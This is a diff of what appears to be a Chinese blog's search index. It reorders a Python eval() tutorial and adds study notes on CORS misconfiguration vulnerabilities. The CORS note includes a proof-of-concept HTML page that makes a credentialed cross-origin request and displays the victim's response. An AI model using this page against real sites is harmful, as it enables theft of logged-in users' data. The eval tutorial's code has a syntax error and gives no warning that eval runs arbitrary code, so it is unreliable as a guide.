@@ -1870,37 +1870,6 @@
       </categories>
   </entry>
   <entry>
-    <title>二、拓展py：eval函数拓展</title>
-    <url>/2022/01/05/%E4%BA%8C%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9Aeval%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95/</url>
-    <content><![CDATA[<h1 id="二、拓展py：eval-isinstance函数拓展"><a href="#二、拓展py：eval-isinstance函数拓展" class="headerlink" title="二、拓展py：eval isinstance函数拓展"></a>二、拓展py：eval isinstance函数拓展</h1><h2 id="1-eval函数的简介和语法："><a href="#1-eval函数的简介和语法：" class="headerlink" title="1 eval函数的简介和语法："></a>1 eval函数的简介和语法：</h2><p>eval()函数用来执行一个字符串表达式，并返回表达式的值。还可以把字符串转化为list、tuple、dict。</p>
-<p>eval函数的语法：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(expression[,<span class="built_in">globals</span>[,<span class="built_in">locals</span>]])</span><br></pre></td></tr></table></figure>
-
-
-<p>参数：</p>
-<p>expression：表达式。</p>
-<p>globals：变量作用域，如果被提供，必须是一个字典对象。</p>
-<p>locals：变量作用域，如果被提供，可以是任何映射对象。</p>
-<h2 id="2-eval-函数使用实例："><a href="#2-eval-函数使用实例：" class="headerlink" title="2 eval()函数使用实例："></a>2 eval()函数使用实例：</h2><p>1 字符串转换成列表：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;[1,2,3,4,5]&quot;</span></span><br><span class="line">b=<span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a是字符串类型数据，b是列表类型数据</span></span><br></pre></td></tr></table></figure>
-
-<p>2 字符串转换成字典 ：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;&#123;&quot;</span>name<span class="string">&quot;:&quot;</span>guo<span class="string">&quot;,&quot;</span>age<span class="string">&quot;:25&#125;&quot;</span></span><br><span class="line">b=<span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a为字符串类型数据，b为字典类型数据</span></span><br></pre></td></tr></table></figure>
-
-<p>3 字符串转换为元组：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;(1,2,3,4,5)&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a的数据结构是字符串 b的数据结构是元组</span></span><br></pre></td></tr></table></figure>
-
-<p>4 eval()返回表达式的值：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="number">4</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;3*x&quot;</span>)</span><br><span class="line"><span class="comment">#返回值为12</span></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>&#123;<span class="string">&quot;a+1&quot;</span>,g&#125;</span><br><span class="line"><span class="comment">#返回值为  5</span></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">b=<span class="number">20</span></span><br><span class="line">c=<span class="number">30</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">8</span>&#125;</span><br><span class="line">t=&#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">100</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;a+b+c&#x27;</span>,g,t)</span><br><span class="line"><span class="comment">#返回值为116</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-isinstance"><a href="#3-isinstance" class="headerlink" title="3.isinstance()"></a>3.isinstance()</h2><p>isinstance(变量名,类型)</p>
-<p>返回布尔值</p>
-]]></content>
-      <categories>
-        <category>-python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>五、学习py：代码规范 知识补充（pass is 位运算）</title>
     <url>/2021/12/30/%E4%BA%94%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83-%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85%EF%BC%88pass-is-%E4%BD%8D%E8%BF%90%E7%AE%97%EF%BC%89/</url>
     <content><![CDATA[<h1 id="五、学习py：代码规范-知识补充（pass-is-位运算）"><a href="#五、学习py：代码规范-知识补充（pass-is-位运算）" class="headerlink" title="五、学习py：代码规范 知识补充（pass is 位运算）"></a>五、学习py：代码规范 知识补充（pass is 位运算）</h1><h2 id="1-代码规范"><a href="#1-代码规范" class="headerlink" title="1.代码规范"></a>1.代码规范</h2><h3 id="1-1名称"><a href="#1-1名称" class="headerlink" title="1.1名称"></a>1.1名称</h3><p>文件夹，小写&amp;小写下划线连接</p>
@@ -1934,6 +1903,37 @@
 
 <h3 id="2-3位运算"><a href="#2-3位运算" class="headerlink" title="2.3位运算"></a>2.3位运算</h3><p>因为计算机底层的运算就是二进制的运算，所以这里的位运算就是指对二进制的一个计算，实际上就是数电里面的那些运算规则。</p>
 <p>与 或 异或 同或 取反等等</p>
+]]></content>
+      <categories>
+        <category>-python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>二、拓展py：eval函数拓展</title>
+    <url>/2022/01/05/%E4%BA%8C%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9Aeval%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95/</url>
+    <content><![CDATA[<h1 id="二、拓展py：eval-isinstance函数拓展"><a href="#二、拓展py：eval-isinstance函数拓展" class="headerlink" title="二、拓展py：eval isinstance函数拓展"></a>二、拓展py：eval isinstance函数拓展</h1><h2 id="1-eval函数的简介和语法："><a href="#1-eval函数的简介和语法：" class="headerlink" title="1 eval函数的简介和语法："></a>1 eval函数的简介和语法：</h2><p>eval()函数用来执行一个字符串表达式，并返回表达式的值。还可以把字符串转化为list、tuple、dict。</p>
+<p>eval函数的语法：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(expression[,<span class="built_in">globals</span>[,<span class="built_in">locals</span>]])</span><br></pre></td></tr></table></figure>
+
+
+<p>参数：</p>
+<p>expression：表达式。</p>
+<p>globals：变量作用域，如果被提供，必须是一个字典对象。</p>
+<p>locals：变量作用域，如果被提供，可以是任何映射对象。</p>
+<h2 id="2-eval-函数使用实例："><a href="#2-eval-函数使用实例：" class="headerlink" title="2 eval()函数使用实例："></a>2 eval()函数使用实例：</h2><p>1 字符串转换成列表：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;[1,2,3,4,5]&quot;</span></span><br><span class="line">b=<span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a是字符串类型数据，b是列表类型数据</span></span><br></pre></td></tr></table></figure>
+
+<p>2 字符串转换成字典 ：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;&#123;&quot;</span>name<span class="string">&quot;:&quot;</span>guo<span class="string">&quot;,&quot;</span>age<span class="string">&quot;:25&#125;&quot;</span></span><br><span class="line">b=<span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a为字符串类型数据，b为字典类型数据</span></span><br></pre></td></tr></table></figure>
+
+<p>3 字符串转换为元组：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;(1,2,3,4,5)&quot;</span></span><br><span class="line"><span class="built_in">eval</span>(a)</span><br><span class="line"><span class="comment">#a的数据结构是字符串 b的数据结构是元组</span></span><br></pre></td></tr></table></figure>
+
+<p>4 eval()返回表达式的值：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="number">4</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;3*x&quot;</span>)</span><br><span class="line"><span class="comment">#返回值为12</span></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">4</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>&#123;<span class="string">&quot;a+1&quot;</span>,g&#125;</span><br><span class="line"><span class="comment">#返回值为  5</span></span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">b=<span class="number">20</span></span><br><span class="line">c=<span class="number">30</span></span><br><span class="line">g=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">6</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">8</span>&#125;</span><br><span class="line">t=&#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">100</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;a+b+c&#x27;</span>,g,t)</span><br><span class="line"><span class="comment">#返回值为116</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-isinstance"><a href="#3-isinstance" class="headerlink" title="3.isinstance()"></a>3.isinstance()</h2><p>isinstance(变量名,类型)</p>
+<p>返回布尔值</p>
 ]]></content>
       <categories>
         <category>-python</category>
@@ -3111,6 +3111,27 @@
 <p>关于ipc段</p>
 <p><a href="http://www.360doc.com/content/20/0607/06/7696210_916944202.shtml">IP C段是什么意思 (360doc.com)</a></p>
 <p>听说很多学校或者机构都喜欢把一些东西放在c段。</p>
+]]></content>
+      <categories>
+        <category>-penetration</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>跨域漏洞.md</title>
+    <url>/2022/03/17/%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E-md/</url>
+    <content><![CDATA[<h1 id="跨域漏洞"><a href="#跨域漏洞" class="headerlink" title="跨域漏洞"></a>跨域漏洞</h1><h1 id="cors跨域漏洞"><a href="#cors跨域漏洞" class="headerlink" title="cors跨域漏洞"></a>cors跨域漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>●1.假设用户登陆一个含有CORS配置网站<a href="http://vuln.com,同时又访问了攻击者提供的一个链接http//evil.com%E3%80%82">http://vuln.com，同时又访问了攻击者提供的一个链接http://evil.com。</a></p>
+<p>●<a href="http://2.evil.com的网站向http//vuln.com%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E8%83%BD%E5%90%A6%E6%8E%A5%E6%94%B6%E4%BF%A1%E6%81%AF%E5%8F%96%E5%86%B3%E4%BA%8Ehttp://vuln.com%E7%9A%84%E9%85%8D%E7%BD%AE%E3%80%82">http://2.evil.com的网站向http://vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于http://vuln.com的配置。</a></p>
+<p>●3.如果<a href="http://vuln.com配置了access-control-allow-origin头且为预期,那么允许接收,否则浏览器会因为同源策略而不接收/">http://vuln.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收</a></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- cors.html --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>cors exp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;  </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();  </span></span><br><span class="line"><span class="javascript">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">this</span>.status == <span class="number">200</span>) &#123;    </span></span><br><span class="line"><span class="javascript">    alert(<span class="built_in">this</span>.responseText);  </span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = <span class="built_in">this</span>.responseText;    </span></span><br><span class="line"><span class="javascript">    &#125;  </span></span><br><span class="line"><span class="javascript">&#125;;  </span></span><br><span class="line"><span class="javascript">xhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://www.baidu.com&quot;</span>);  </span></span><br><span class="line"><span class="javascript">xhttp.withCredentials = <span class="literal">true</span>;  </span></span><br><span class="line"><span class="javascript">xhttp.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">cors();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://blog.csdn.net/weixin_45605352/article/details/119245952">(54条消息) CORS和JSONP跨域漏洞_DDao_blog的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/weixin_41598660/article/details/106050957">(54条消息) Jsonp跨域漏洞浅析_努力的学渣’#的博客-CSDN博客_jsonp跨域漏洞</a></p>
+<p><a href="https://www.cnblogs.com/sevck/p/9035422.html">CORS跨域资源共享漏洞 - sevck - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://www.freebuf.com/articles/web/204023.html">CORS（跨域资源共享）错误配置漏洞的高级利用 - FreeBuf网络安全行业门户</a></p>
+<p><a href="https://blog.csdn.net/weixin_41679427/article/details/97536860">(54条消息) CORS跨域漏洞的学习_CanMeng’Blog的博客-CSDN博客_跨域漏洞</a></p>
+<p><a href="https://www.anquanke.com/post/id/152339">JSONP和CORS跨站跨域读取资源的漏洞利用（附带EXP） - 安全客，安全资讯平台 (anquanke.com)</a></p>
 ]]></content>
       <categories>
         <category>-penetration</category>
